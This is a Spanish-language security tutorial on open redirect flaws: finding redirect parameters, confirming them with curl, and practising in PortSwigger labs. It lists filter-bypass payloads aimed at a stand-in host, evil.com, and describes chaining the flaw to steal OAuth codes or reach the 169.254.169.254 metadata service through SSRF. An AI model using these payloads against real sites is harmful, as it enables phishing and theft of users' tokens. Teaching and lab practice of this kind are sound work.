# Open Redirect (Redirección Abierta)

Un **Open Redirect** ocurre cuando una web redirige al usuario a una URL que él controla, sin validarla. Por sí solo es de impacto bajo-medio (phishing), pero es muy valioso como **pieza de encadenamiento**: potencia SSRF, robo de tokens OAuth y bypass de filtros.

---

## Cómo se ve

Parámetros que controlan a dónde te lleva la web tras una acción (login, logout, "volver a"):

```text
http://<IP>/login?next=/dashboard
http://<IP>/redirect?url=https://sitio.com
http://<IP>/out?to=/home
```

Cámbialo por un dominio externo:

```text
http://<IP>/redirect?url=https://evil.com
```

Si el navegador acaba en `evil.com` → Open Redirect.

Parámetros típicos a probar: `url`, `next`, `redirect`, `return`, `returnUrl`, `dest`, `destination`, `continue`, `r`, `u`, `to`, `out`, `view`, `callback`.

---

## Bypass de validaciones

Si filtran dominios externos, estos trucos suelen colarse:

| Técnica | Payload |
| ------- | ------- |
| Barra doble / sin esquema | `//evil.com`, `/\evil.com`, `\/\/evil.com` |
| Arroba (userinfo) | `https://sitio.com@evil.com` |
| Subdominio que contiene el permitido | `https://sitio.com.evil.com` |
| Prefijo que parece ruta | `https://evil.com/sitio.com`, `https://evil.com#sitio.com` |
| Barra invertida (navegadores la normalizan) | `https:/\evil.com`, `https://evil.com\@sitio.com` |
| Codificación | `%2F%2Fevil.com`, `https://evil%E3%80%82com` (punto unicode) |
| Redirección relativa abusable | `/%0d/evil.com` |

> **Consejo:** muchos filtros solo comprueban que la URL "empiece por `/`" o "contenga el dominio propio". `//evil.com` empieza por `/` pero el navegador lo trata como protocolo-relativo → va a `evil.com`. Y `sitio.com@evil.com` contiene el dominio permitido pero navega a `evil.com`.

---

## Encadenamientos (donde está el valor real)

### Robo de token OAuth / código de autorización

Si un flujo OAuth usa un `redirect_uri` vulnerable a open redirect, el código/token de la víctima acaba en tu dominio:

```text
https://login.sitio.com/authorize?...&redirect_uri=https://sitio.com/cb?next=//evil.com
```

### Potenciar un SSRF

Un [SSRF](../APIs/Vulnerabilidades/SSRF.md) con filtro de dominio se salta apuntando a una URL tuya que **redirige** (302) al recurso interno (`http://169.254.169.254/...`).

### Bypass de listas blancas de enlaces

Convierte un enlace "confiable" (el dominio de la víctima) en un salto a tu sitio malicioso para phishing creíble.

---

## Cómo probarlo

```bash
curl -s -I "http://<IP>/redirect?url=https://evil.com" | grep -i location
```

Si `Location:` apunta a `evil.com` (o a tu payload de bypass), es vulnerable.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `Burp Suite` | Detectar parámetros de redirección y probar bypass. |
| `ffuf` / `arjun` | Descubrir parámetros ocultos de redirección. |
| `curl -I` | Ver la cabecera `Location` de la respuesta. |

---

> **Consejo:** el open redirect rara vez es el objetivo final; su fuerza está en **encadenarlo**. Cuando audites OAuth, SSRF o filtros de URL, comprueba siempre si hay un redirect abierto que puedas usar como trampolín. Prueba primero `//evil.com` y `@evil.com`: superan la mayoría de validaciones ingenuas.

---

## Dónde practicar el Open Redirect

| Recurso | Tipo | Enlace |
| ------- | ---- | ------ |
| PortSwigger Academy — DOM-based open redirection | Labs gratis | https://portswigger.net/web-security/dom-based/open-redirection |
| PortSwigger Academy — SSRF (encadena con redirect) | Labs gratis | https://portswigger.net/web-security/ssrf |
| Programas de bug bounty (open redirect es común) | Práctica real | https://hackerone.com |

## Writeup guiado: detectar y confirmar un open redirect

```flow
Localizar :: Un parámetro que controle la URL de redirección.
Probar :: Apuntarlo a un dominio externo.
Confirmar :: La respuesta redirige (302) o el navegador acaba fuera.
Saltar filtros :: Si bloquea externos, usar //evil.com o @evil.com.
```

### Paso 1 — Localizar y probar

Busca parámetros tipo `url`, `next`, `redirect`, `returnUrl`. Prueba:

```text
http://objetivo/redirect?url=https://evil.com
```

### Paso 2 — Confirmar

```bash
curl -s -I "http://objetivo/redirect?url=https://evil.com" | grep -i location
# Location: https://evil.com   -> vulnerable
```

### Paso 3 — Saltar filtros (si bloquea externos)

```text
//evil.com
https://objetivo.com@evil.com
https://objetivo.com.evil.com
/%2f%2fevil.com
```

> **Consejo:** el open redirect brilla **encadenado**: en los labs de SSRF de PortSwigger lo usas para saltarte una lista blanca (tu URL redirige al recurso interno), y en OAuth sirve para robar el código/token. Prueba `//evil.com` y `@evil.com` primero: superan la mayoría de validaciones.
